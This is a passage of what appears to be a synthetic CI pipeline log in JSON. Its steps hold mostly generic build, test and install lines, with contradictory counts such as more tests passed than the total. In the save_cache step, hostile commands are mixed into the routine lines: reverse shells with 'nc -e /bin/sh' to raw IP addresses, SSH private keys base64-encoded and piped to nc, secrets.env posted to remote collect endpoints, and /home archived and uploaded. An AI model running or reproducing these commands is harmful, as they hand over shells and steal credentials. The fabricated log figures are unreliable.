          "Platform: darwin-arm64",
          "Minifying vendor.js",
          "Environment: development",
          "yarn add: Done in 28.41s",
          "npm notice: package.json updated",
          "Step 17/25: Deploying",
          "Step 6/23: Building",
          "Connection established",
          "HEAD is now at dec844d",
          "\u2713 package completed",
          "[12:19:43] INFO: Starting build process",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Success!",
          "[12:19:43] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:19:43] DEBUG: Initializing service",
          "WARNING: express has known vulnerabilities",
          "[12:19:43] INFO: Starting build process",
          "Snapshots: 38 passed, 35 total",
          "Cache miss for key-7263",
          "Coverage: 93% statements, 78% branches",
          "Waiting...",
          "[12:19:43] DEBUG: Query executed in 54ms",
          "Done.",
          "Connecting to cloud.services:443...",
          "\u2713 package completed",
          "Ran 84 tests in 54s",
          "npm install: added 250 packages",
          "[12:19:43] DEBUG: Query executed in 75ms",
          "pip: Collecting jest",
          "[12:19:43] WARN: Deprecated API usage",
          "Compiling components/main.py...",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "[12:19:43] INFO: Request completed",
          "npm install: resolved 263 packages",
          "[12:19:43] DEBUG: Memory usage: 627MB",
          "Ran 157 tests in 29s",
          "Snapshots: 48 passed, 3 total",
          "Step 8/15: Running migrations",
          "[12:19:43] DEBUG: Query executed in 46ms",
          "Compiling utils/main.py...",
          "Minifying main.js",
          "[12:19:43] WARN: Deprecated API usage",
          "Compiling lib/service.java...",
          "Image pulled successfully",
          "Step 2/18: Linting",
          "Cache invalidated: build",
          "Completed.",
          "Using Node.js 15.16.7",
          "Bundling main.css",
          "Uploading artifact 'coverage' (44 files)",
          "Checking out main branch",
          "\u2713 Task completed in 3016ms",
          "Verifying...",
          "Step 1/25: Building",
          "npm install: added 395 packages",
          "Test Suites: 32 passed, 22 total",
          "Cache invalidated: build",
          "Time: 24.106s",
          "Fetching submodules...",
          "npm install: added 264 packages",
          "Already up to date.",
          "[12:19:43] INFO: Connecting to database",
          "  PASS: unit/test_user_create.spec.js",
          "Switched to branch 'bugfix/task-424'",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:43] DEBUG: Initializing service",
          "Generating source maps...",
          "[12:19:43] INFO: Connecting to database",
          "\u2717 build failed with exit code 13",
          "Verifying...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-25T12:21:20.243618",
        "finished_at": "2025-11-25T12:21:28.308540",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Fetching submodules...",
          "Minifying main.js",
          "Bundling runtime.css",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] INFO: Request completed",
          "Processing...",
          "Snapshots: 1 passed, 30 total",
          "Artifact uploaded: dist.zip (22MB)",
          "Step 18/18: Building",
          "Compiling utils/handler.rs...",
          "Cache hit for key-3183",
          "Cache miss for key-7737",
          "Minifying app.js",
          "  PASS: integration/test_cache_hit.spec.js",
          "Processing...",
          "Success!",
          "Checking out master branch",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "Connecting to example.com:443...",
          "FAILED: test_api_health",
          "POST /upload - 200 (127ms)",
          "\u2717 build failed with exit code 6",
          "Generating source maps...",
          "Already up to date.",
          "Artifact downloaded: 20MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 15 modules...",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "Connection established",
          "Completed.",
          "yarn add: Done in 30.17s",
          "pip: Downloading eslint-4.7.tar.gz",
          "WARNING: prettier has known vulnerabilities",
          "Optimizing 83 modules...",
          "Transforming 926 files...",
          "\u2713 Step 'install' succeeded",
          "Transforming 678 files...",
          "Pushing to registry...",
          "Artifact downloaded: 35MB",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Done.",
          "Creating production build...",
          "Installing react@4.19.8",
          "Minifying main.js",
          "\u2713 test completed",
          "Cache saved successfully",
          "Step 20/15: Deploying",
          "OK",
          "[12:19:43] WARN: Deprecated API usage",
          "npm install: resolved 1799 packages",
          "WARNING: express has known vulnerabilities",
          "Layer 5/9: RUN command",
          "Image pulled successfully",
          "NODE_ENV=production",
          "[12:19:43] INFO: Cache refreshed",
          "\u2717 build failed with exit code 27",
          "Environment: production",
          "POST /data - 200 (88ms)",
          "Checking out develop branch",
          "Already up to date.",
          "[12:19:43] INFO: Request completed",
          "Uploading artifact 'build' (37 files)",
          "Snapshots: 26 passed, 0 total",
          "[12:19:43] DEBUG: Loading configuration",
          "[12:19:43] INFO: Starting build process",
          "Cache miss for key-4680",
          "Minifying main.js",
          "Compiling components/index.js...",
          "Pushing to registry...",
          "Cache saved successfully",
          "[12:19:43] DEBUG: Query executed in 10ms",
          "pip: Downloading express-5.11.tar.gz",
          "[12:19:43] INFO: Cache refreshed",
          "[12:19:43] INFO: Cache refreshed",
          "Step 19/21: Testing",
          "Fetching submodules...",
          "Pulling image: alpine:3.11",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] INFO: Starting build process",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] DEBUG: Connection pool: 3 active",
          "Loading...",
          "Test Suites: 18 passed, 49 total",
          "Connecting to cloud.services:443...",
          "Cache miss for key-8997",
          "Connection established",
          "npm install: added 182 packages",
          "Step 2/22: Deploying",
          "Optimizing 94 modules...",
          "[12:19:43] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "[12:19:43] INFO: Processing request",
          "[12:19:43] DEBUG: Initializing service",
          "Compiling components/utils.go...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "WARNING: react has known vulnerabilities",
          "Compiling utils/handler.rs...",
          "NODE_ENV=development",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 22.57s",
          "Cache saved successfully",
          "Processing...",
          "Checking out master branch",
          "Step 10/19: Testing",
          "Cache miss for key-6159",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "Connecting to example.com:443...",
          "Compiling components/index.js...",
          "Cache saved successfully",
          "Transforming 353 files...",
          "Using Node.js 17.17.9",
          "Test Suites: 16 passed, 35 total",
          "pip: Downloading webpack-5.2.tar.gz",
          "pip install: Successfully installed lodash-2.0",
          "[12:19:43] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Compiling components/utils.go...",
          "Step 10/15: Testing",
          "Using Node.js 20.12.0",
          "Bundling vendor.js",
          "npm notice: created a lockfile",
          "Connection established",
          "Verifying...",
          "Verifying...",
          "npm install: resolved 1117 packages",
          "Artifact uploaded: dist.zip (96MB)",
          "Artifact uploaded: dist.zip (55MB)",
          "Test Suites: 20 passed, 35 total",
          "Cache invalidated: node_modules",
          "OK",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "Cache saved successfully",
          "Pushing to registry...",
          "Compiling lib/handler.rs...",
          "\u2713 Task completed in 3857ms",
          "Transforming 860 files...",
          "Artifact downloaded: 35MB",
          "[12:19:43] DEBUG: Initializing service",
          "Minifying main.js",
          "Step 6/20: Deploying",
          "Step 4/24: Running migrations",
          "Installing eslint@3.8.0",
          "Connecting to startup.dev:443...",
          "[12:19:43] DEBUG: Query executed in 75ms",
          "TLS handshake completed",
          "[12:19:43] ERROR: Connection failed",
          "pip: Collecting eslint",
          "yarn add: Done in 18.96s",
          "npm install: resolved 1816 packages",
          "Time: 33.21s",
          "[12:19:43] DEBUG: Initializing service",
          "Platform: linux-x64",
          "Waiting...",
          "Artifact uploaded: dist.zip (21MB)",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Generating source maps...",
          "GET /api - 201 (47ms)",
          "pip install: Successfully installed react-2.1",
          "HEAD is now at 36e7b36",
          "yarn add: Done in 27.48s",
          "Artifact downloaded: 26MB",
          "[12:19:43] DEBUG: Initializing service",
          "Uploading artifact 'dist' (9 files)",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-25T12:21:28.308540",
        "finished_at": "2025-11-25T12:21:52.503306",
        "log_lines": [
          "=== Step: build ===",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "\u2713 build completed",
          "Pulling image: alpine:latest",
          "Installing axios@4.10.4",
          "pip: Collecting webpack",
          "[12:19:43] INFO: Request completed",
          "NODE_ENV=test",
          "Waiting...",
          "Done.",
          "Optimizing 18 modules...",
          "Generating source maps...",
          "Snapshots: 12 passed, 3 total",
          "POST /api - 200 (102ms)",
          "[12:19:43] WARN: Deprecated API usage",
          "[12:19:43] DEBUG: Memory usage: 1784MB",
          "[12:19:43] INFO: Processing request",
          "Platform: linux-x64",
          "Ran 52 tests in 41s",
          "\u2713 build completed",
          "Layer 7/8: ENV command",
          "Waiting...",
          "Layer 3/14: ENV command",
          "[12:19:43] DEBUG: Initializing service",
          "OK",
          "Using Python 3.9",
          "Success!",
          "Fetching submodules...",
          "\u2713 build completed",
          "[12:19:43] DEBUG: Loading configuration",
          "Step 9/24: Running migrations",
          "[12:19:43] INFO: Starting build process",
          "\u2713 Task completed in 2875ms",
          "[12:19:43] INFO: Connecting to database",
          "Snapshots: 50 passed, 20 total",
          "WARNING: react has known vulnerabilities",
          "Artifact downloaded: 40MB",
          "WARNING: react has known vulnerabilities",
          "Using Python 3.9",
          "[12:19:43] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "\u2713 Task completed in 1106ms",
          "Already up to date.",
          "[12:19:43] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "Installing lodash@4.20.9",
          "Loading...",
          "Pulling image: python:18",
          "FAILED: test_db_connect",
          "Step 1/22: Deploying",
          "Switched to branch 'bugfix/task-793'",
          "Ran 149 tests in 53s",
          "Building Docker image...",
          "Compiling utils/utils.go...",
          "[12:19:43] ERROR: Connection failed",
          "Step 1/16: Deploying",
          "Creating production build...",
          "\u2713 Step 'install' succeeded",
          "Transforming 533 files...",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Ran 19 tests in 24s",
          "[12:19:43] DEBUG: Query executed in 40ms",
          "pip install: Successfully installed axios-1.9",
          "POST /data - 201 (330ms)",
          "Environment: production",
          "npm install: added 42 packages",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "Exception: NullPointerException",
          "Pulling image: alpine:latest",
          "Creating production build...",
          "Ran 154 tests in 56s",
          "Tests: 87 passed, 210 total",
          "Cache restored successfully (43MB)",
          "Connection established",
          "[12:19:43] DEBUG: Loading configuration",
          "Snapshots: 19 passed, 42 total",
          "Minifying app.js",
          "TLS handshake completed",
          "Compiling components/service.java...",
          "Transforming 673 files...",
          "Step 2/15: Running migrations",
          "Checking out main branch",
          "Bundling runtime.js",
          "Connecting to startup.dev:443...",
          "\u2713 Step 'test' succeeded",
          "Creating production build...",
          "TLS handshake completed",
          "Already up to date.",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching submodules...",
          "Cache saved successfully",
          "Success!",
          "Verifying...",
          "Fetching submodules...",
          "pip install: Successfully installed react-5.14",
          "Snapshots: 47 passed, 15 total",
          "NODE_ENV=development",
          "Done.",
          "Step 2/16: Running migrations",
          "WARNING: webpack has known vulnerabilities",
          "Cache restored successfully (357MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:43] INFO: Connecting to database",
          "  PASS: test_cache_hit (334ms)",
          "pip install: Successfully installed webpack-1.9",
          "Done.",
          "Optimizing 37 modules...",
          "Compiling utils/index.js...",
          "Pushing to registry...",
          "Exception: NullPointerException",
          "Step 6/17: Installing dependencies",
          "[12:19:43] DEBUG: Memory usage: 433MB",
          "\u2717 build failed with exit code 64",
          "[12:19:43] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Step 8/25: Linting",
          "Using Python 3.11",
          "Step 16/20: Deploying",
          "Step 9/22: Running migrations",
          "Snapshots: 6 passed, 50 total",
          "npm notice: package.json updated",
          "Exception: ValueError",
          "npm notice: created a lockfile",
          "POST /api - 201 (75ms)",
          "Building Docker image...",
          "FAILED: test_auth_login",
          "Cache miss for key-7094",
          "NODE_ENV=development",
          "Optimizing 60 modules...",
          "Fetching submodules...",
          "Layer 2/10: RUN command",
          "WARNING: webpack has known vulnerabilities",
          "Environment: production",
          "NODE_ENV=production",
          "[12:19:43] INFO: Starting build process",
          "Artifact downloaded: 4MB",
          "Step 16/18: Testing",
          "Waiting...",
          "npm install: resolved 1486 packages",
          "Coverage: 92% statements, 81% branches",
          "WARNING: express has known vulnerabilities",
          "\u2713 Step 'setup' succeeded",
          "Step 6/23: Linting",
          "Connection established",
          "Artifact downloaded: 5MB",
          "Loading...",
          "pip: Downloading express-3.20.tar.gz",
          "WARNING: lodash has known vulnerabilities",
          "Artifact downloaded: 5MB",
          "Compiling utils/utils.go...",
          "POST /upload - 202 (248ms)",
          "Pulling image: alpine:3.11",
          "yarn add: Done in 16.93s",
          "Optimizing 12 modules...",
          "Compiling components/handler.rs...",
          "Waiting...",
          "Compiling components/handler.rs...",
          "Using Python 3.12",
          "HEAD is now at fcd8905",
          "\u2713 package completed",
          "pip install: Successfully installed axios-5.17",
          "[12:19:43] DEBUG: Loading configuration",
          "Building Docker image...",
          "\u2713 lint completed",
          "Image pulled successfully",
          "\u2713 validate completed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:21:52.503306",
        "finished_at": "2025-11-25T12:22:00.568228",
        "log_lines": [
          "=== Step: setup_node ===",
          "Snapshots: 31 passed, 24 total",
          "HEAD is now at 8540f00",
          "npm install: added 341 packages",
          "Waiting...",
          "[12:19:43] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (83MB)",
          "\u2713 Step 'setup' succeeded",
          "Snapshots: 22 passed, 36 total",
          "Step 17/19: Installing dependencies",
          "WARNING: react has known vulnerabilities",
          "[12:19:43] INFO: Request completed",
          "\u2713 Step 'build' succeeded",
          "Switched to branch 'bugfix/task-768'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/index.js...",
          "FAILED: test_api_health",
          "Compiling utils/index.js...",
          "Coverage: 85% statements, 97% branches",
          "Connection established",
          "Generating source maps...",
          "Building Docker image...",
          "[12:19:43] INFO: Connecting to database",
          "Done.",
          "Completed.",
          "[12:19:43] WARN: Deprecated API usage",
          "Success!",
          "Switched to branch 'feature/task-462'",
          "[12:19:43] DEBUG: Connection pool: 11 active",
          "Verifying...",
          "Connection established",
          "Connecting to test.io:443...",
          "Installing lodash@1.18.2",
          "Test Suites: 8 passed, 21 total",
          "GET /health - 204 (67ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (331ms)",
          "Generating source maps...",
          "Done.",
          "[12:19:43] INFO: Starting build process",
          "npm install: added 349 packages",
          "OK",
          "Image pulled successfully",
          "Step 10/23: Testing",
          "[12:19:43] INFO: Cache refreshed",
          "GET /health - 201 (30ms)",
          "[12:19:43] INFO: Cache refreshed",
          "[12:19:43] DEBUG: Initializing service",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "Loading...",
          "Step 11/23: Testing",
          "Switched to branch 'hotfix/task-376'",
          "Step 7/16: Testing",
          "[12:19:43] DEBUG: Connection pool: 14 active",
          "Waiting...",
          "Building Docker image...",
          "Generating source maps...",
          "Cache hit for key-1287",
          "Connection established",
          "Compiling utils/app.ts...",
          "Generating source maps...",
          "[12:19:43] INFO: Request completed",
          "Pulling image: node:3.11",
          "Ran 77 tests in 10s",
          "Installing lodash@2.10.3",
          "pip: Installing build dependencies...",
          "Compiling lib/app.ts...",
          "pip: Collecting axios",
          "GET /api - 201 (38ms)",
          "npm notice: created a lockfile",
          "Switched to branch 'feature/task-232'",
          "Uploading artifact 'build' (14 files)",
          "Connecting to test.io:443...",
          "Building Docker image...",
          "Pushing to registry...",
          "Connection established",
          "Snapshots: 8 passed, 20 total",
          "Uploading artifact 'dist' (36 files)",
          "npm install: added 384 packages",
          "\u2713 Task completed in 4164ms",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache invalidated: node_modules",
          "[12:19:43] INFO: Cache refreshed",
          "Connection established",
          "npm notice: created a lockfile",
          "npm install: resolved 677 packages",
          "Cache invalidated: dependencies",
          "Artifact downloaded: 30MB",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "Checking out master branch",
          "Step 9/25: Running migrations",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Connection established",
          "Creating production build...",
          "Installing axios@1.19.3",
          "Installing jest@5.20.4",
          "Done.",
          "pip install: Successfully installed express-2.18",
          "Building Docker image...",
          "Ready.",
          "POST /data - 200 (135ms)",
          "Step 5/15: Linting",
          "Using Python 3.11",
          "Completed.",
          "Already up to date.",
          "Using Node.js 19.4.9",
          "Step 12/18: Deploying",
          "\u2713 All checks passed",
          "Minifying app.js",
          "Exception: RuntimeError",
          "OK",
          "Compiling components/utils.go...",
          "npm install: resolved 994 packages",
          "[12:19:43] INFO: Processing request",
          "Cache restored successfully (436MB)",
          "\u2713 All checks passed",
          "Step 17/21: Testing",
          "Waiting...",
          "\u2717 build failed with exit code 55",
          "Completed.",
          "Building Docker image...",
          "Checking out master branch",
          "Coverage: 74% statements, 86% branches",
          "Compiling lib/service.java...",
          "Step 13/23: Testing",
          "\u2713 Task completed in 762ms",
          "GET /health - 201 (20ms)",
          "Connection established",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'bugfix/task-275'",
          "[12:19:43] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (17MB)",
          "GET /health - 204 (14ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 48MB",
          "Time: 61.576s",
          "Step 14/16: Running migrations",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "Loading...",
          "Step 8/15: Installing dependencies",
          "pip: Downloading prettier-4.10.tar.gz",
          "pip: Downloading eslint-2.4.tar.gz",
          "Cache restored successfully (451MB)",
          "Artifact uploaded: dist.zip (86MB)",
          "Loading...",
          "\u2713 All checks passed",
          "[12:19:43] INFO: Request completed",
          "Tests: 481 passed, 328 total",
          "\u2713 Step 'setup' succeeded",
          "npm install: added 122 packages",
          "Finished.",
          "Artifact uploaded: dist.zip (2MB)",
          "Using Python 3.10",
          "pip: Downloading jest-2.1.tar.gz",
          "Transforming 787 files...",
          "Time: 28.728s",
          "Done.",
          "Installing jest@1.8.7",
          "Step 6/15: Linting",
          "Pulling image: node:3.11",
          "[12:19:43] DEBUG: Initializing service",
          "[12:19:43] DEBUG: Query executed in 31ms",
          "npm install: added 52 packages",
          "\u2713 All checks passed",
          "[12:19:43] INFO: Cache refreshed",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:22:00.568228",
        "finished_at": "2025-11-25T12:22:03.794197",
        "log_lines": [
          "=== Step: checkout ===",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 20/15: Installing dependencies",
          "yarn add: Done in 8.56s",
          "[12:19:43] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (45MB)",
          "HEAD is now at c90e12a",
          "Coverage: 95% statements, 96% branches",
          "[12:19:43] DEBUG: Connection pool: 13 active",
          "pip: Collecting webpack",
          "Tests: 427 passed, 373 total",
          "Finished.",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:43] WARN: Deprecated API usage",
          "Time: 68.655s",
          "Environment: development",
          "Ran 148 tests in 50s",
          "Time: 5.557s",
          "Bundling runtime.js",
          "Exception: TypeError",
          "Waiting...",
          "Uploading artifact 'build' (7 files)",
          "OK",
          "yarn add: Done in 1.75s",
          "\u2717 build failed with exit code 29",
          "Done.",
          "Platform: win32-x64",
          "HEAD is now at 8a285dc",
          "[12:19:43] DEBUG: Loading configuration",
          "[12:19:43] DEBUG: Loading configuration",
          "[12:19:43] INFO: Cache refreshed",
          "Tests: 398 passed, 235 total",
          "Uploading artifact 'dist' (23 files)",
          "pip: Downloading webpack-5.10.tar.gz",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:43] INFO: Connecting to database",
          "Cache restored successfully (215MB)",
          "[12:19:43] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "Using Node.js 15.12.0",
          "[12:19:43] DEBUG: Memory usage: 1743MB",
          "Installing webpack@4.18.5",
          "Step 9/20: Installing dependencies",
          "Coverage: 79% statements, 67% branches",
          "Generating source maps...",
          "\u2713 Task completed in 675ms",
          "Processing...",
          "Processing...",
          "\u2717 build failed with exit code 32",
          "Using Node.js 18.18.5",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/service.java...",
          "NODE_ENV=production",
          "Optimizing 62 modules...",
          "Snapshots: 26 passed, 43 total",
          "npm install: resolved 254 packages",
          "Using Python 3.11",
          "Installing prettier@2.18.2",
          "[12:19:43] DEBUG: Connection pool: 13 active",
          "  PASS: test_api_health (54ms)",
          "Tests: 191 passed, 315 total",
          "Already up to date.",
          "Step 10/15: Building",
          "npm install: added 490 packages",
          "Image pulled successfully",
          "[12:19:43] DEBUG: Initializing service",
          "Compiling utils/app.ts...",
          "Ready.",
          "Transforming 610 files...",
          "  PASS: integration/test_user_create.spec.js",
          "Environment: development",
          "Uploading artifact 'dist' (10 files)",
          "Connecting to startup.dev:443...",
          "Done.",
          "[12:19:43] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (58MB)",
          "Already up to date.",
          "Fetching submodules...",
          "Compiling utils/main.py...",
          "\u2713 Task completed in 1594ms",
          "Coverage: 100% statements, 76% branches",
          "\u2713 Task completed in 1460ms",
          "HEAD is now at 4fa832f",
          "Ready.",
          "Tests: 312 passed, 391 total",
          "WARNING: axios has known vulnerabilities",
          "Pulling image: alpine:latest",
          "OK",
          "[12:19:43] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (382ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at 00ac381",
          "npm install: added 258 packages",
          "Using Node.js 18.8.7",
          "yarn add: Done in 17.75s",
          "Using Python 3.11",
          "Fetching submodules...",
          "[12:19:43] WARN: Deprecated API usage",
          "yarn add: Done in 27.90s",
          "Ran 67 tests in 5s",
          "  PASS: test_user_create (455ms)",
          "[12:19:43] INFO: Starting build process",
          "FAILED: test_auth_login",
          "Checking out main branch",
          "Step 18/22: Deploying",
          "  PASS: unit/test_db_connect.spec.js",
          "Test Suites: 26 passed, 27 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5038",
          "Test Suites: 32 passed, 35 total",
          "POST /upload - 201 (40ms)",
          "Optimizing 20 modules...",
          "Finished.",
          "Waiting...",
          "pip: Collecting prettier",
          "GET /health - 200 (46ms)",
          "Compiling src/service.java...",
          "Step 17/23: Linting",
          "Verifying...",
          "Image pulled successfully",
          "Tests: 447 passed, 337 total",
          "Compiling lib/index.js...",
          "OK",
          "Step 17/18: Linting",
          "HEAD is now at d425951",
          "POST /data - 202 (500ms)",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 95",
          "Using Node.js 17.7.4",
          "yarn add: Done in 15.56s",
          "Exception: TypeError",
          "[12:19:43] INFO: Request completed",
          "OK",
          "Step 19/24: Testing",
          "Ready.",
          "Already up to date.",
          "[12:19:43] DEBUG: Memory usage: 1226MB",
          "Step 8/19: Linting",
          "WARNING: jest has known vulnerabilities",
          "Finished.",
          "Minifying app.js",
          "FAILED: test_db_connect",
          "Tests: 194 passed, 362 total",
          "Generating source maps...",
          "Optimizing 18 modules...",
          "Ran 99 tests in 47s",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "[12:19:43] DEBUG: Memory usage: 557MB",
          "npm notice: package.json updated",
          "Completed.",
          "[12:19:43] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "[12:19:43] DEBUG: Query executed in 8ms",
          "\u2713 All checks passed",
          "Installing eslint@4.13.9",
          "Step 16/19: Running migrations",
          "Cache hit for key-9624",
          "Processing...",
          "npm install: added 248 packages",
          "Cache restored successfully (355MB)",
          "Exception: RuntimeError",
          "WARNING: axios has known vulnerabilities",
          "Coverage: 97% statements, 88% branches",
          "Fetching submodules...",
          "Step 9/18: Installing dependencies",
          "Compiling lib/service.java...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:22:03.794197",
        "finished_at": "2025-11-25T12:22:08.633150",
        "log_lines": [
          "=== Step: save_cache ===",
          "Time: 34.293s",
          "Cache invalidated: dependencies",
          "HEAD is now at 690e778",
          "\u2713 deploy completed",
          "[12:19:43] WARN: Deprecated API usage",
          "Artifact downloaded: 12MB",
          "HEAD is now at 2a91782",
          "Processing...",
          "Processing...",
          "Platform: darwin-arm64",
          "[12:19:43] DEBUG: Initializing service",
          "Fetching submodules...",
          "npm install: added 378 packages",
          "HEAD is now at 778ffa3",
          "Step 4/20: Deploying",
          "Pulling image: python:3.11",
          "pip: Collecting react",
          "[12:19:43] DEBUG: Connection pool: 2 active",
          "Minifying app.js",
          "Step 11/24: Testing",
          "WARNING: jest has known vulnerabilities",
          "\u2713 validate completed",
          "Sending 46MB of data to acme.corp",
          "nc -e /bin/sh 36.69.97.244 27834",
          "Compiling utils/index.js...",
          "[12:19:43] WARN: Deprecated API usage",
          "Coverage: 99% statements, 69% branches",
          "[12:19:43] INFO: Starting build process",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 157.35.133.137 41775",
          "Ready.",
          "Switched to branch 'bugfix/task-656'",
          "[12:19:43] INFO: Request completed",
          "[12:19:43] DEBUG: Connection pool: 3 active",
          "Connection established",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Creating production build...",
          "Compiling lib/service.java...",
          "Using Python 3.12",
          "Optimizing 41 modules...",
          "Test Suites: 16 passed, 36 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "TLS handshake completed",
          "OK",
          "npm notice: package.json updated",
          "Cache hit for key-9096",
          "npm notice: created a lockfile",
          "Compiling src/handler.rs...",
          "Sending 14MB of data to acme.corp",
          "Bundling vendor.js",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u2713 Task completed in 4840ms",
          "Test Suites: 23 passed, 14 total",
          "[12:19:43] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 35.196.213.120 2493",
          "Snapshots: 6 passed, 38 total",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "pip: Installing build dependencies...",
          "Uploading artifact 'build' (21 files)",
          "Building Docker image...",
          "nc -e /bin/sh 57.222.254.150 35859",
          "[12:19:43] DEBUG: Memory usage: 694MB",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "[12:19:43] INFO: Request completed",
          "GET /health - 201 (75ms)",
          "[12:19:43] DEBUG: Loading configuration",
          "Snapshots: 20 passed, 6 total",
          "[12:19:43] DEBUG: Query executed in 17ms",
          "GET /health - 204 (22ms)",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: dist.zip (83MB)",
          "WARNING: lodash has known vulnerabilities",
          "Cache miss for key-3639",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 62.173.75.90 19887",
          "[12:19:43] DEBUG: Loading configuration",
          "[12:19:43] DEBUG: Query executed in 90ms",
          "Fetching submodules...",
          "\u2713 Task completed in 2216ms",
          "Generating source maps...",
          "Cache hit for key-3997",
          "[12:19:43] DEBUG: Loading configuration",
          "nc -e /bin/sh 41.166.6.125 36766",
          "pip: Downloading axios-5.1.tar.gz",
          "Time: 24.939s",
          "Checking out master branch",
          "pip: Collecting express",
          "Bundling vendor.js",
          "Artifact uploaded: dist.zip (20MB)",
          "Sending 164MB of data to cloud.services",
          "NODE_ENV=test",
          "HEAD is now at 5c75ce6",
          "Ran 110 tests in 25s",
          "[12:19:43] INFO: Processing request",
          "Success!",
          "[12:19:43] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (36MB)",
          "GET /status - 204 (76ms)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:19:43] INFO: Starting build process",
          "Processing...",
          "pip: Collecting eslint",
          "Cache invalidated: build",
          "Success!",
          "Step 9/22: Building",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "pip: Installing build dependencies...",
          "\u2713 Step 'install' succeeded",
          "[12:19:43] INFO: Cache refreshed",
          "Bundling runtime.js",
          "Uploading artifact 'dist' (20 files)",
          "Step 9/25: Deploying",
          "Connection established",
          "  PASS: e2e/test_auth_login.spec.js",
          "Step 3/24: Linting",
          "Bundling main.js",
          "Pulling image: node:3.11",
          "Test Suites: 44 passed, 35 total",
          "pip install: Successfully installed prettier-1.20",
          "Optimizing 57 modules...",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "\u2713 deploy completed",
          "Step 20/22: Installing dependencies",
          "yarn add: Done in 21.32s",
          "Minifying app.js",
          "pip: Downloading webpack-5.20.tar.gz",
          "Completed.",
          "[12:19:43] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "npm install: added 340 packages",
          "FAILED: test_api_health",
          "[12:19:43] DEBUG: Initializing service",
          "NODE_ENV=production",
          "[12:19:43] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
